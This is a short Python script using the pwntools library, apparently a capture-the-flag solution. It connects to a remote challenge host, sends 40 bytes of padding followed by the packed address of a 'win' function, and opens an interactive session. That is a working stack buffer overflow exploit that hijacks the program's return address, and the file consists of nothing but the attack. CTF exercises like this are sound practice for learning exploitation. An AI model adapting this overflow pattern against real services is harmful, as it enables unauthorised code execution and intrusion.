from pwn import *

p = remote("mc.ax", 31077)

win = p64(0x04011f6)

pad = "a" * 40

p.send(pad+win)
p.interactive()